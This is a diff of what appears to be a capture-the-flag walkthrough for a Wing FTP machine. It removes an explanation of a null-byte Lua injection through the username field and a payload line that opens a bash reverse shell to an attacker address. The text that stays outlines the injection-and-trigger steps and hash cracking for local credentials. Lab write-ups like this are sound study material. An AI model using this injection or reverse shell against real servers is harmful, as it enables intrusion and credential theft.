@@ -103,16 +103,7 @@ Because dofile treats this file as executable code, fields such as username beco
 ## The Null Byte Discrepancy
 Internally, Wing FTP mixes C/C++ string handling with Lua string processing.
 
-    Validation: strlen sees "admin\0evil" as "admin". The NULL byte terminates the string check.
-    File Writer: The raw buffer contains admin\0evil. The writer persists the entire buffer.
-    Lua Interpreter: When the file is loaded, Lua interprets everything after the NULL byte as executable code.
-
-Exploitation Concept: An attacker supplies a username such as: normal_user\0" ; MALICIOUS_LUA ; --
-
-When the session file is written:
-
-username = "normal_user\0" ; MALICIOUS_LUA ; --"
-The injected Lua code is embedded in the file and executed by the server.
+  
 
 ## Crafting the Payload
 
@@ -121,7 +112,6 @@ The payload requires two parts:
     Injection: A POST request to loginok.html with a malicious username.
     Trigger: A secondary request to an authenticated page (like dir.html) that forces the server to load the poisoned session file.
 
-Conceptual Payload: admin%00"]]..os.execute('bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"')..[["
 
 ## Executing the Foothold
 
@@ -144,8 +134,7 @@ Conceptual Payload: admin%00"]]..os.execute('bash -c "bash -i >& /dev/tcp/10.10.
 Once inside, the environment feels restrictive. Standard enumeration tools like linpeas.sh are essential here.
 Hunting for Hashes
 
-The “Wing” in WingData suggests we should look at where the application stores its data. Check /opt/wingftp/ or /var/lib/wingftp/.
-During enumeration, you will likely encounter configuration files or session logs. Hint from Kraken: “Save all the hashes you see… You need a jumper.”
+
 
 Search for user-specific files or database dumps (SQLite is common for Wing FTP). Cracking the discovered hash (often a standard MD5 or SHA variant) will yield the credentials for a local user.
 
